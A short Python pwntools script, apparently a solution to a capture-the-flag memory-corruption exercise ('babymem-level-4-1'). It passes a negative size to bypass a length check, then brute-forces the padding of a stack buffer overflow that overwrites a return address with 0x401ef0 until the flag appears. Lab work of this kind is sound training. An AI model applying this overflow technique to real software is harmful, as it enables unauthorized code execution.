from pwn import *
i = 10
while True:
    print("try "+ str(i))
    p = process('/challenge/babymem-level-4-1')
    p.sendline(b'-1')
    p.send(b'A'*i + p32(0x401ef0))
    text = p.recvall().decode()
    if "pwn" in text:
        print(text)
        break
    i += 1